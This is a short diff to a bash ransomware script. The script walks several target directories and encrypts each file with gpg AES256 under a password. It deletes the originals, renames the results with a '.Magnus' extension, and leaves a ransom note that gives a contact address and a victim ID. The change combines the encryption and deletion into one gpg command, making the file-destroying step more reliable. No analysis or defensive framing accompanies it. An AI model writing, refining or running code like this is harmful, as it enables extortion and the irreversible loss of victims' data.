@@ -65,10 +65,7 @@ for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $targ
     if [ -d "$file" ]; then
         continue
     fi
-
-    echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 "$file"
-    rm "$file"
-    mv "$file.gpg" "$file.Magnus"
+    echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 -o "$file.Magnus" "$file" && rm "$file"
 done
 
 echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt
